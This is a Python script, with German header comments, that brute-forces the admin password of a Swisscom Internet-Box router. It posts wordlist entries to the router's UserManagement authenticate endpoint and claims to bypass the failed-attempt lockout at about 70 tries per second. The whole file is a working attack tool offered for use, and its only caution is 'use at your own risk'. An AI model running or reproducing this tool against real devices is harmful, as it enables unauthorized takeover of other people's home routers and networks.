# -*- coding: utf-8 -*-
# USE AT YOUR OWN RISK | BENUTZUNG AUF EIGENE VERANTWORUNG
#
# Mit diesem Skript lässt sich die Swisscom Internet-Box Bruteforcen. Das Programm umgeht die Sperre bei zu vielen Fehlversuchen. Das Programm schafft ~70 Versuche pro Sekunde
#
# Die Funktion, die von diesem Programm (aus)genutzt wird, fällt *NICHT* in den Bereich des Bug Bounty Programmes der Swisscom
#
#
# usage: swisscom_ib_bruteforcer.py [-h] [--host HOST] [--useragent USERAGENT] wordlist
#
# Author: Mauro Sbicego

#!/usr/bin/env python3

import requests
import time
import argparse


parser = argparse.ArgumentParser()
parser.add_argument("--host", help="Internetbox IP (Default: 192.168.1.1)", default="192.168.1.1")
parser.add_argument("--useragent", help="Set User-Agent (Default: Mozilla/5.0)", default="Mozilla/5.0")
parser.add_argument("wordlist", help="Path to wordlist")
args = parser.parse_args()

host = args.host
useragent = args.useragent
listlocation = args.wordlist

def bruteforce(pw_list):
    found = False
    start = time.time()
    n = 0
    for pw in pws:
        n = n+1
        payload = '{"parameters":{"name":"admin","password":"' + pw + '","groups":["http","admin"]}}'
        r = requests.post(requrl, data=payload, headers=headers).json()
        if n % 10 == 0:
            print(str(((len(pws)-1)/100)*n/100) + "%")
        else:
            pass
        if r['status'] == True:
            print("Found Password: " + pw)
            found = True
            break
        else:
            pass
    if found:
        pass
    else:
        print("Couldn't find password")
    end = time.time()
    print(str(end - start) + " seconds elapsed")
    

requrl = "http://" + host + "/sysbus/UserManagement:authenticate"
headers = {'Content-Type': 'application/x-sah-ws-4-call+json', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': useragent, 'Accept': '*/*', 'Accept-Language':'en-US,en;q=0.5', 'Host':host, 'Referer': 'http://'+host+'/'}

wl = open(listlocation, "r")
pws = []
pws = wl.read().split('\n')

bruteforce(pws)
